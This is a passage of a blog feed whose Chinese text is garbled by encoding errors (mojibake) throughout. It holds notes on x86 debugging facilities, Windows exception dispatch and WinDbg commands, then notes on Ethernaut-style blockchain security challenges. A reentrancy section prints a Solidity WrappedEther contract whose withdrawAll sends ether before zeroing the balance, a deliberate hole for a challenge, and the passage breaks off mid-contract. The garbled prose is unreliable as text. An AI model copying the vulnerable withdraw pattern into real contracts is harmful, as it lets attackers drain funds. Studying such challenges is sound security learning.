    <content type="html"><![CDATA[<h2 id="X86çš„ä¸»è¦è°ƒè¯•è®¾æ–½">X86çš„ä¸»è¦è°ƒè¯•è®¾æ–½</h2><p>INT 3 æŒ‡ä»¤   è½¯ä»¶æ–­ç‚¹åŸºç¡€<br>è¿½è¸ªæ ‡å¿—TF   å•æ­¥è¿½è¸ªçš„åŸºç¡€<br>è°ƒè¯•å¯„å­˜å™¨   ç¡¬ä»¶å¯„å­˜å™¨çš„åŸºç¡€<br>åˆ†æ”¯ç›‘è§†å’Œè®°å½•   æŒ‰åˆ†æ”¯å•æ­¥çš„åŸºç¡€</p><h2 id="è½¯ä»¶æ–­ç‚¹">è½¯ä»¶æ–­ç‚¹</h2><p>0xCC int3æŒ‡ä»¤<br>æœºå™¨ç ä¸º1å­—èŠ‚ï¼Œæ— æ•°é‡é™åˆ¶ï¼Œåªæ”¯æŒä»£ç æ®µ(å¯æ‰§è¡Œçš„æ®µ)ï¼Œä¸”ä¸æ”¯æŒåœ¨åªè¯»å­˜å‚¨å™¨ä¸­ä½¿ç”¨</p><p>å°†ä¸€ä¸ªint 3 å†™å…¥ï¼Œè§¦å‘å¼‚å¸¸breakä¹‹åä¼šè¢«æ¢å¤ï¼Œå†æ‰§è¡Œåä¼šå†æ¬¡å†™å…¥</p><h2 id="ç¡¬ä»¶æ–­ç‚¹">ç¡¬ä»¶æ–­ç‚¹</h2><p>é€šè¿‡è°ƒè¯•å¯„å­˜å™¨å®ç°ï¼ŒDR0åˆ°DR3 çš„å››ä¸ªå¯„å­˜å™¨ä¸­å­˜æ”¾ç›®æ ‡åœ°å€<br>DR7æœ‰8ç»„è®¾ç½®æ ‡å¿—ä½ï¼Œæ¯ç»„åˆ†åˆ«æœ‰2ä¸ª2ä½æ ‡å¿—ï¼Œå…¶ä¸­ä¸€ä¸ªæ ‡å¿—è¡¨ç¤ºR/Wï¼Œå¦ä¸€ä¸ªæ ‡å¿—è¡¨ç¤ºé•¿åº¦<br>CPUæ¯æ‰§è¡Œ1æ­¥å°±è¿›è¡Œä¸€æ¬¡åŒ¹é…ï¼Œå¦‚æœæ˜¯è¿™ä¸ªåœ°å€ï¼Œæ¨¡å¼æ­£ç¡®ï¼Œå°±ä¼šå†™å…¥DR6çš„æ ‡å¿—ä½ï¼Œç„¶åè§¦å‘æ–­ç‚¹(äº§ç”Ÿ1å·å¼‚å¸¸)ï¼Œæ“ä½œç³»ç»Ÿé€šè¿‡æ£€æŸ¥æ ‡å¿—ä½çŸ¥é“å“ªä¸€ä¸ªå‘½ä¸­äº†æ–­ç‚¹</p><p>ç”±äºæ¯ä¸ªçº¿ç¨‹çš„å¯„å­˜å™¨ä¿¡æ¯ç‹¬ç«‹ä¿å­˜ï¼Œæ‰€ä»¥æ¯ä¸ªçº¿ç¨‹éƒ½å¯ä»¥è®¾4ä¸ªåœ°å€</p><h2 id="é™·é˜±æ ‡å¿—">é™·é˜±æ ‡å¿—</h2><p>æ ‡å¿—å¯„å­˜å™¨efl(ag)çš„TFä½<br>å•æ­¥å¼‚å¸¸åœ¨eflçš„æœ€ä½ä½ã€‚æ¯å½“eflæœ€åä¸€ä½æ˜¯1ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ç½®0ï¼Œç„¶åè§¦å‘å•æ­¥å¼‚å¸¸</p><h2 id="å¼‚å¸¸">å¼‚å¸¸</h2><p>å‰é¢å‡ èŠ‚å·²ç»å·®ä¸å¤šè¯´æ˜äº†ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ã€‚ä¸è¿‡åœ¨ç¨‹åºä¸­ï¼Œå°¤å…¶æ˜¯VSç”Ÿæˆçš„ä»£ç ï¼Œä¸€èˆ¬æ¥è¯´ä½çº§çš„å¼‚å¸¸å¾€å¾€ä¼šå°è£…æˆCxxå¼‚å¸¸ã€‚</p><h3 id="ä¸­æ–­å‘é‡è¡¨">ä¸­æ–­å‘é‡è¡¨</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span>é™¤é›¶å¼‚å¸¸</span><br><span class="line"><span class="symbol">1 </span>è°ƒè¯•å¼‚å¸¸</span><br><span class="line"><span class="symbol">3 </span>æ–­ç‚¹å¼‚å¸¸</span><br><span class="line"><span class="symbol">4 </span>æº¢å‡ºå¼‚å¸¸</span><br><span class="line"><span class="symbol">5 </span>æ•°ç»„è¶Šç•Œå¼‚å¸¸</span><br><span class="line"><span class="symbol">6 </span>éæ³•æŒ‡ä»¤å¼‚å¸¸</span><br><span class="line"><span class="symbol">13 </span>ä¿æŠ¤å¼‚å¸¸</span><br><span class="line"><span class="symbol">14 </span>ç¼ºé¡µå¼‚å¸¸</span><br><span class="line"><span class="symbol">18 </span>æœºå™¨æ£€æŸ¥å¼‚å¸¸</span><br><span class="line"><span class="number">32</span>-<span class="number">255</span> ç”¨æˆ·è‡ªå®šä¹‰ï¼Œå¾ˆå¤šæ˜¯ä¸­æ–­ï¼Œè€Œä¸æ˜¯å¼‚å¸¸</span><br></pre></td></tr></table></figure><h3 id="æ¥æº">æ¥æº</h3><p>CPUäº§ç”Ÿ æ‰§è¡ŒæŒ‡ä»¤æ£€æµ‹åˆ°çš„é”™è¯¯ï¼Œæœºå™¨å¼‚å¸¸ï¼Œè°ƒè¯•å¼‚å¸¸ç­‰<br>ç¨‹åºäº§ç”Ÿï¼ŒRaiseException win32api<br>C++ throw E</p><h2 id="JTAG">JTAG</h2><p>ç¡¬ä»¶è°ƒè¯•æ ‡å‡†</p><h2 id="ç”¨æˆ·æ€è°ƒè¯•æ¨¡å‹XP">ç”¨æˆ·æ€è°ƒè¯•æ¨¡å‹XP</h2><p>æ–­ç‚¹å‘½ä¸­æ—¶ï¼ŒCPUç«‹å³åˆ‡æ¢åˆ°å†…æ ¸æ‰§è¡Œä¸€ç³»åˆ—å¼‚å¸¸å¤„ç†å‡½æ•°ã€‚å…¶ä¸­KISystemServiceè°ƒç”¨KiRaiseException()äº§ç”Ÿå¼‚å¸¸KiDebugServiceå’ŒKiTrap04~00åšåˆ†å‘å‡†å¤‡ã€‚KiDispatchException()æ˜¯åˆ†å‘ä¸­æ¢ï¼Œä¼šé€šçŸ¥ç”¨æˆ·æ€è°ƒè¯•å­ç³»ç»ŸDbgkï¼Œç„¶åè§¦å‘DbgkForwardExcption()ï¼Œå¦‚æœæœ‰è°ƒè¯•å™¨æ‰§è¡ŒDbgkpSendApiMessages()ç»§ç»­ä¼ é€’ï¼Œåˆ°DbgkQueueMessage()ç”Ÿæˆè°ƒè¯•äº‹ä»¶å¹¶å°†äº§ç”Ÿçš„è°ƒè¯•å¯¹è±¡æŒ‚åˆ°å†…æ ¸è°ƒè¯•å¯¹è±¡é˜Ÿåˆ—ä¸­ã€‚è°ƒè¯•å™¨ä¸€ç›´ç­‰å¾…è¿™ä¸ªé˜Ÿåˆ—ï¼Œæœ‰è°ƒè¯•å¯¹è±¡æ—¶å°±ä¼šå–å‡ºå¹¶å¤„ç†ã€‚</p><h3 id="è°ƒè¯•å™¨çš„è½½å…¥ç¨‹åº">è°ƒè¯•å™¨çš„è½½å…¥ç¨‹åº</h3><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¼šåœ¨ç›®æ ‡è¿›ç¨‹åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œint 3ï¼Œä½†æ˜¯ç³»ç»Ÿåœ¨åˆ†å‘å¼‚å¸¸æ—¶ä¼šå†»ç»“æ‰€æœ‰çº¿ç¨‹</p><h2 id="KiDisPatchException">KiDisPatchException</h2><p>ç”¨æˆ·æ€å¼‚å¸¸å†…å«2è½®å¼‚å¸¸åˆ†å‘ï¼š<br>ç¬¬ä¸€è½®ï¼š</p><p>å¦‚æœæ²¡æœ‰ç”¨æˆ·æ€è°ƒè¯•å™¨ï¼Œå°è¯•åˆ†å‘ç»™å†…æ ¸è°ƒè¯•å™¨<br>DbgkForwardExceptionå°è¯•äº¤ç»™ç”¨æˆ·æ€è°ƒè¯•å™¨<br>å¤åˆ¶æ ˆå¸§ç„¶åæ”¹ç¨‹åºæŒ‡é’ˆåˆ°KeUserExceptionDispatcheråˆ°ç”¨æˆ·æ€</p><p>ç¬¬äºŒè½®ï¼š</p><p>DbgkForwardExceptionå°è¯•äº¤ç»™ç”¨æˆ·æ€è°ƒè¯•å™¨<br>ç„¶åå°è¯•äº¤ç»™æœåŠ¡è¿›ç¨‹ï¼Œè®©æœåŠ¡è¿›ç¨‹åšæœ€åå¤„ç†ï¼Œä¸€èˆ¬ç›´æ¥æ€æ­»<br>å¦‚æœè¿˜æ˜¯ä¸å¤„ç†ï¼Œç›´æ¥è°ƒç”¨ZwTerminateProcessåœ¨å†…æ ¸æ€æ€æ­»</p><blockquote><p>äº§ç”Ÿç¡¬ä»¶å¼‚å¸¸é€šè¿‡ IDTè°ƒç”¨å¼‚å¸¸å¤„ç†ä¾‹ç¨‹ï¼Œ äº§ç”Ÿè½¯ä»¶å¼‚å¸¸é€šè¿‡ APIçš„å±‚å±‚è°ƒç”¨äº§åœ°å¼‚å¸¸ä¿¡æ¯ã€‚è€Œå¼‚å¸¸åˆç”±äºå‘ç”Ÿä½ç½®ä¸åŒï¼Œåˆ†ä¸ºå†…æ ¸å¼‚å¸¸å’Œç”¨æˆ·æ€å¼‚å¸¸ï¼ŒäºŒè€…æœ€åéƒ½ä¼šé  <code>kiDispathException</code>å‡½æ•°æ¥è¿›è¡Œå¼‚å¸¸åˆ†å‘ï¼›<br>å½“å†…æ ¸äº§ç”Ÿå¼‚å¸¸æ—¶ï¼Œç¨‹åºå¤„ç†æµç¨‹è¿›å…¥åˆ° <code>KiDispatchException</code>å‡½æ•°ï¼Œåœ¨è¯¥å‡½æ•°å†…å¤‡ä»½å½“å‰çº¿ç¨‹ R3 çš„ <code>TrapFrame</code>ï¼ˆå³æ ˆå¸§çš„åŸºå€ï¼‰ã€‚å¼‚å¸¸å¤„ç†é¦–å…ˆåˆ¤æ–­è¿™æ˜¯å¦æ˜¯ç¬¬ä¸€æ¬¡å¼‚å¸¸ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨å†…æ ¸è°ƒè¯•å™¨ï¼Œå¦‚æœæœ‰å†…æ ¸è°ƒè¯•å™¨ï¼Œåˆ™æŠŠå½“å‰çš„å¼‚å¸¸ä¿¡æ¯å‘é€ç»™å†…æ ¸è°ƒè¯•å™¨ï¼›å¦‚æœæ²¡æœ‰å†…æ ¸è°ƒè¯•å™¨æˆ–è€…å†…æ ¸è°ƒè¯•å™¨æ²¡æœ‰å¤„è¯¥å¼‚å¸¸ ï¼Œ åˆ™è¿›å…¥æ­¥éª¤3ï¼Œè°ƒç”¨ <code>RtlDispatchException</code>ã€‚<br>å†…æ ¸å¼‚å¸¸è¿›å…¥ <code>RtlDispatchException</code> å‡½ æ•°ï¼Œ å¦‚æœ<code>RtlDispatchException</code> å‡½æ•°æ²¡æœ‰å¤„ç†è¯¥å¼‚å¸¸ï¼Œé‚£ä¹ˆå°†å†æ¬¡å°è¯•å°†å¼‚å¸¸å‘é€åˆ°å†…æ ¸è°ƒè¯•å™¨ï¼Œå¦‚æœæ­¤æ—¶å†…æ ¸è°ƒè¯•å™¨ä»ç„¶ä¸å­˜åœ¨æˆ–è€…æ²¡æœ‰å¤„ç†è¯¥å¼‚å¸¸ï¼Œé‚£ä¹ˆæ­¤æ—¶ç³»ç»Ÿä¼šç›´æ¥è“å±ï¼›<br>å¦‚æœæ˜¯ç”¨æˆ·æ€å¼‚å¸¸åˆ™ç»è¿‡ <code>KiDispatchException</code>è¿›è¡Œç”¨æˆ·æ€å¼‚å¸¸åˆ†å‘å’Œå¤„ç†ã€‚å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡åˆ†å‘å¼‚å¸¸ï¼Œåˆ™è°ƒç”¨ <code>DbgKForwardException</code>å°†å¼‚å¸¸åˆ†å‘åˆ°å†…æ ¸è°ƒè¯•å™¨ï¼›å¦‚æœå†…æ ¸è°ƒè¯•å™¨ä¸å­˜åœ¨æˆ–æ²¡æœ‰å¤„ç†å¼‚å¸¸ï¼Œåˆ™å°è¯•å°†å¼‚å¸¸åˆ†å‘ç»™ç”¨æˆ·æ€è°ƒè¯•å™¨ï¼›å¦‚æœå¼‚å¸¸è¢«å¤„ç†ï¼Œåˆ™è¿›å…¥æ­¥éª¤10ï¼›å¦‚æœç”¨æˆ·æ€è°ƒè¯•å™¨ä¸å­˜åœ¨æˆ–æœªå¤„ç†å¼‚å¸¸ï¼Œåˆ™æ£€æµ‹æ˜¯å¦æ˜¯ç¬¬ä¸€æ¬¡å¤„ç†å¼‚å¸¸ï¼Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡å¤„ç†å¼‚å¸¸åˆ™è¿›å…¥ç¬¬5æ­¥ä¸­çš„å¼‚å¸¸æ•°æ®å‡†å¤‡ï¼›<br>å‡†å¤‡ä¸€ä¸ªè¿”å›ntdll!<code>KiUserExceptionDispatcher</code> å‡½æ•°çš„åº”ç”¨å±‚è°ƒç”¨æ ˆï¼Œç»“æŸæœ¬æ¬¡<code>KiDispatchException</code> å‡½æ•°çš„è¿è¡Œï¼Œè°ƒç”¨<code>KiServiceExit</code> è¿”å›ç”¨æˆ·å±‚ã€‚æ­¤æ—¶å‡½æ•°æ ˆå¸§æ˜¯ntdll!<code>KiUserExceptionDispatcher</code>çš„æ‰§è¡Œç¯å¢ƒï¼Œç”¨æˆ·æ€çº¿ç¨‹ä»æ‰§è¡Œ ntdll!<code>KiUserExceptionDispatcher</code> å¼€å§‹æ‰§è¡Œã€‚è¯¥å‡½æ•°è°ƒç”¨ ntdll!RtlDispatchExceptionè¿›è¡Œå¼‚å¸¸çš„åˆ†å‘ï¼Œè¿›å…¥ç¬¬ 6 æ­¥ï¼›<br>é€šè¿‡ <code>RtlCallVectoredExceptionHandlers</code>éå† VEHé“¾è¡¨å°è¯•æŸ¥æ‰¾å¼‚å¸¸å¤„ç†å‡½æ•°ï¼›å¦‚æœ VEHæœªå¤„ç†å¼‚å¸¸ã€‚åˆ™ä» fs[0]è¯»å– ExceptionListå¹¶å¼€å§‹æ‰§è¡Œ SEH å‡½æ•°å¤„ç†ï¼Œè¿›å…¥æ­¥éª¤7ï¼›<br>å¦‚æœSEHæ²¡æœ‰å¤„ç†å‡½æ•°å¤„ç†è¯¥å¼‚å¸¸ï¼Œåˆ™æ£€æŸ¥ç”¨æˆ·æ˜¯å¦é€šè¿‡<code>SetUnhandledExceptionFilter</code>å‡½æ•°æ³¨å†Œè¿‡è¿›ç¨‹çš„å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œå¦‚æœç”¨æˆ·æ³¨å†Œè¿‡å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œè°ƒç”¨è¯¥å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œå¦‚æœå¼‚å¸¸æ²¡æœ‰è¢«æˆåŠŸå¤„ç†æˆ–æ²¡æœ‰è‡ªå®šä¹‰çš„å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œåˆ™è¿›å…¥æ­¥éª¤3ï¼›<br>å¦‚æœæœ€åä»æ²¡æœ‰å¤„ç†è¯¥å¼‚å¸¸ï¼Œä¾¿ä¼šä¸»åŠ¨è°ƒç”¨ <code>NtRaiseException</code>å°†è¯¥å¼‚å¸¸é‡æ–°è·‘å‡ºæ¥ï¼Œä½†æ˜¯æ­¤æ—¶ä¸æ˜¯ç¬¬ä¸€æ¬¡åˆ†å‘ï¼Œæ­¤æ—¶ <code>NtRaiseException</code>æµç¨‹é‡æ–°è°ƒç”¨äº† ntdll!<code>KiDispatchException</code>ï¼Œå¹¶å†æ¬¡è¿›å…¥ç”¨æˆ·æ€å¼‚å¸¸çš„å¤„ç†åˆ†æ”¯ï¼Œè¿›å…¥æ­¥éª¤9ï¼›<br>ç¬¬äºŒæ¬¡è¿›å…¥ç”¨æˆ·æ€å¼‚å¸¸å¤„ç†æ—¶ï¼Œä¸ä¼šå†å°è¯•å‘é€åˆ°å†…æ ¸è°ƒè¯•å™¨ï¼Œä¹Ÿä¸ä¼šå†è¿›è¡Œå¼‚å¸¸åˆ†å‘ï¼Œè€Œæ˜¯ç›´æ¥å°è¯•å‘é€åˆ°ç”¨æˆ·æ€ä½“å¼‚å¸¸è°ƒè¯•å™¨ï¼Œå¦‚æœæœ€åå¼‚å¸¸ä»æœªè¢«å¤„ç†åˆ™è¿›å…¥æ­¥éª¤11ï¼›<br>å¼‚å¸¸è¢«å¤„ç†ï¼Œè°ƒç”¨ NtContineï¼Œå°†ä¹‹å‰ä¿å­˜çš„ TrapFrameè¿˜åŸï¼Œç¨‹åºç»§ç»­ä»å¼‚å¸¸å¤„æ­£å¸¸è¿è¡Œï¼›<br>å¼‚å¸¸ä¸èƒ½è¢«å¤„ç†ï¼Œç³»ç»Ÿè°ƒç”¨ ntdll!<code>KiDispatchException</code> è°ƒç”¨ ZeTerminateProcessç»“æŸè¿›ç¨‹ã€‚</p></blockquote><hr><h2 id="WinDbgå¸¸è§æŒ‡ä»¤">WinDbgå¸¸è§æŒ‡ä»¤</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">t step into</span><br><span class="line">p step over</span><br><span class="line">g run</span><br><span class="line">g <span class="keyword">addr </span>è½¬åˆ°æŒ‡å®šä½ç½®</span><br><span class="line"><span class="keyword">bp </span><span class="keyword">addr </span>ä¸‹è½¯ä»¶æ–­ç‚¹</span><br><span class="line"><span class="keyword">ba </span><span class="keyword">addr </span>ä¸‹ç¡¬ä»¶æ–­ç‚¹</span><br><span class="line">r æ˜¾ç¤ºå¯„å­˜å™¨</span><br><span class="line">r register æ˜¾ç¤ºæŒ‡å®šå¯„å­˜å™¨</span><br><span class="line">u æ˜¾ç¤ºä¸‹ä¸€æ¡æŒ‡ä»¤</span><br><span class="line">u <span class="keyword">addr </span>çœ‹å¯¹åº”åœ°å€æŒ‡ä»¤</span><br><span class="line">u L10 æ˜¾ç¤ºä¸‹<span class="number">10</span>è¡ŒæŒ‡ä»¤</span><br><span class="line">ub æ˜¾ç¤ºä¸Šä¸€æ¡æŒ‡ä»¤</span><br><span class="line">k çœ‹æ ˆå›æº¯</span><br><span class="line">~* çœ‹å½“å‰çº¿ç¨‹</span><br><span class="line">~num k çœ‹æŸä¸ªï¼ˆåºå·ä¸ºnumï¼‰çº¿ç¨‹çš„æ ˆå›æº¯</span><br><span class="line">x moduleName!*funcName åœ¨å¯¹åº”ä½ç½®è®¾ç½®æ–­ç‚¹</span><br><span class="line"><span class="keyword">bp </span>moduleName!funcName <span class="string">&quot;æŒ‡ä»¤&quot;</span> æ–­ç‚¹å‘½ä¸­åæ‰§è¡ŒæŒ‡ä»¤,æ¯”å¦‚<span class="string">&quot;.echo *********;k;gc&quot;</span>è‡ªåŠ¨kç„¶ågo</span><br><span class="line">sxe ld æ¨¡å—åŠ è½½æ—¶åœæ­¢</span><br><span class="line">lm æ˜¾ç¤ºåŠ è½½çš„æ¨¡å—</span><br><span class="line">dt (<span class="keyword">display </span>type)æ˜¾ç¤ºç±»å‹</span><br><span class="line">dt struct name æ˜¾ç¤ºç»“æ„æˆå‘˜</span><br><span class="line">dt struct name <span class="keyword">address </span>å°†ç›®æ ‡åœ°å€å½“ä½œç»“æ„ä½“æ˜¾ç¤º</span><br></pre></td></tr></table></figure><p>ä»¥Noninvasiveæ¨¡å¼å¯ä»¥åªè¯»çš„å½¢å¼é™„åŠ </p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><a href="https://www.bilibili.com/video/BV1A4411D7xx?p=2">2.æ¦‚è§ˆå’Œè½¯ä»¶æ–­ç‚¹_å“”å“©å“”å“©_bilibili</a></p><p><a href="https://zhuanlan.zhihu.com/p/573449712">windows SEHåˆ†æ - çŸ¥ä¹</a></p><p><a href="https://blog.csdn.net/LPWSTR/article/details/78714486?spm=1001.2014.3001.5501">Windowså¼‚å¸¸ä¸–ç•Œå†é™©è®°ï¼ˆäºŒï¼‰â€”â€”Win32ç”¨æˆ·å±‚ä¸‹SEHæœºåˆ¶ä¹‹å¯¹RtlUnwindçš„é€†å‘åˆ†æ-CSDNåšå®¢</a></p>]]></content>
    
    
    <summary type="html">è°ƒè¯•çš„åŸç†</summary>
    
    
    
    <category term="çŸ¥è¯†é›†" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="é€†å‘" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="Winå†…æ ¸" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/Win%E5%86%85%E6%A0%B8/"/>
    
    
    <category term="windows" scheme="https://www.pri87.vip/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>åŒºå—é“¾å®‰å…¨1-åšé¢˜</title>
    <link href="https://www.pri87.vip/posts/2967681d.html"/>
    <id>https://www.pri87.vip/posts/2967681d.html</id>
    <published>2025-02-09T06:42:19.000Z</published>
    <updated>2025-02-19T19:45:32.264Z</updated>
    
    <content type="html"><![CDATA[<h2 id="level4-Telephone">level4 Telephone</h2><p>tx.addræ˜¯åŸå§‹è°ƒç”¨è€…<br>msg.senderæ˜¯è°ƒç”¨è¿™ä¸ªåˆçº¦çš„è°ƒç”¨è€…</p><p>å¯ä»¥é€šè¿‡è®©åˆçº¦è°ƒç”¨åˆçº¦æ¥å®ç°tx.originä¸ç­‰äºmsg.sender</p><h2 id="level5-Token">level5 Token</h2><p>å‡æ³•å’ŒåŠ æ³•æœ‰æº¢å‡ºï¼Œä½†æ˜¯0.8ç‰ˆæœ¬æœ‰å†…ç½®çš„æ£€æŸ¥</p><h2 id="level6-Delegation">level6 Delegation</h2><p>fallbackå‡½æ•°<br>å‡½æ•°é€‰æ‹©å™¨<br>åº•å±‚é€šè¿‡ä¸åŒçš„å€¼é€‰æ‹©ä¸åŒçš„å‡½æ•°æ‰§è¡Œï¼Œä»è€Œå®ç°æ‰§è¡Œä¸åŒçš„åˆçº¦çš„å‡½æ•°</p><p>å§”æ‰˜è°ƒç”¨ï¼Œç›´æ¥æ‰§è¡Œç›®æ ‡ä»£ç çš„æœºå™¨ç </p><h2 id="level7-Force">level7 Force</h2><p>å¦‚æœä¸€ä¸ªåˆçº¦æ²¡æœ‰receiveå‡½æ•°ï¼Œé‚£ä¹ˆå°±ä¸èƒ½å‘è¿™ä¸ªåˆçº¦è½¬è´¦</p><p>ä½†æ˜¯æœ‰ä¸€ä¸ªè‡ªæ¯å‡½æ•°å¯ä»¥æŠŠæœ¬åˆçº¦é”€æ¯ç„¶åå°†è‡ªèº«ä»¥å¤ªå¸å‘é€åˆ°æŒ‡å®šåœ°å€</p><p>selfdestruct(payable _(_to))</p><h2 id="level8-Vault">level8 Vault</h2><p>åˆçº¦ä¸Šçš„æ‰€æœ‰å†…å®¹éƒ½æ˜¯å…¬å¼€çš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é€šè¿‡æŸ¥çœ‹äº¤æ˜“è®°å½•å¾—åˆ°æ¯ä¸€ä¸ªå­˜æ”¾çš„å€¼</p><h3 id="solidityå†…å­˜æ’å¸ƒ">solidityå†…å­˜æ’å¸ƒ</h3><p>ç”±å˜é‡å£°æ˜é¡ºåºç”±ä¸Šè‡³ä¸‹ç”³è¯·ç©ºé—´ï¼Œæ¯ä¸ªæ’æ§½32byteï¼Œå¦‚æœæ’æ§½ä½ç½®ä¸å¤Ÿäº†ï¼Œå°±æ–°ç”³è¯·ä¸€ä¸ªï¼Œæ”¾åœ¨æ–°ç”³è¯·çš„é‡Œé¢</p><p>æ•°ç»„ï¼Œé€šè¿‡è®¡ç®—keccakÂ§å¾—åˆ°åˆå§‹åœ°å€ï¼Œç„¶åå†å¢åŠ indexå€¼</p><h2 id="é‡å…¥æ”»å‡»">é‡å…¥æ”»å‡»</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.20;</span><br><span class="line"></span><br><span class="line">interface IWrappedEther &#123;</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 amount);</span><br><span class="line">    event Approval(</span><br><span class="line">        address indexed owner,</span><br><span class="line">        address indexed spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    );</span><br><span class="line">    event Deposit(address indexed from, uint256 amount);</span><br><span class="line">    event Withdraw(address indexed to, uint256 amount);</span><br><span class="line"></span><br><span class="line">    function deposit(address to) external payable;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) external;</span><br><span class="line"></span><br><span class="line">    function withdrawAll() external;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) external;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) external;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function allowance(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender</span><br><span class="line">    ) external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract WrappedEther is IWrappedEther &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    function deposit(address to) external payable &#123;</span><br><span class="line">        balanceOf[to] += msg.value;</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) external &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= amount, &quot;insufficient balance&quot;);</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        sendEth(payable(msg.sender), amount);</span><br><span class="line">        emit Withdraw(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdrawAll() external &#123;</span><br><span class="line">        sendEth(payable(msg.sender), balanceOf[msg.sender]);</span><br><span class="line">        balanceOf[msg.sender] = 0;</span><br><span class="line">        emit Withdraw(msg.sender, balanceOf[msg.sender]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) external &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= amount, &quot;insufficient balance&quot;);</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        balanceOf[to] += amount;</span><br><span class="line">        emit Transfer(msg.sender, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external &#123;</span><br><span class="line">        require(balanceOf[from] &gt;= amount, &quot;insufficient balance&quot;);</span><br><span class="line">        require(</span><br><span class="line">            allowance[from][msg.sender] &gt;= amount,</span><br><span class="line">            &quot;insufficient 